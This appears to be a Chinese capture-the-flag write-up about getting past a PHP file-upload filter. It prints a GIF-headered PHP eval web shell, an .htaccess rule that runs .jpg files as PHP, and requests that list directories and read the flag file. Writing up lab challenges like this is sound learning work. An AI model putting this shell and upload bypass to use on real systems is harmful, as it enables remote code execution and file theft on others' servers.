![](<./img/Pasted image 20221107195420.png>)

先随便传个png上去试试

![](<./img/Pasted image 20221107200358.png>)

经过一番尝试发现接受jpeg类型

![](<./img/Pasted image 20221107200345.png>)

改为html风格发现上传成功

![](<./img/Pasted image 20221107200720.png>)
```html
GIF98a
<script language='php'>eval($_GET['cmd']);</script>
```
尝试上传.htaccess，将对jpg文件的访问方式修改

![](<./img/Pasted image 20221107201553.png>)
```
AddType application/x-httpd-php .jpg
```
访问
```php
/upload/xxx/tmp.jpg?cmd=phpinfo();
```
![](<./img/Pasted image 20221107201905.png>)

成功上传
由于`system`被ban，通过`scandir`来查看目录
```php
/?cmd=var_dump(scandir('/'));
```
![](<./img/Pasted image 20221107202258.png>)

最后用`file_get_contents`读取
```php
/?cmd=var_dump(file_get_contents('/flag'));
```
![](<./img/Pasted image 20221107202336.png>)

学到的知识用上了，开心QwQ

#Web #文件上传 #RCE #PHP #bypass 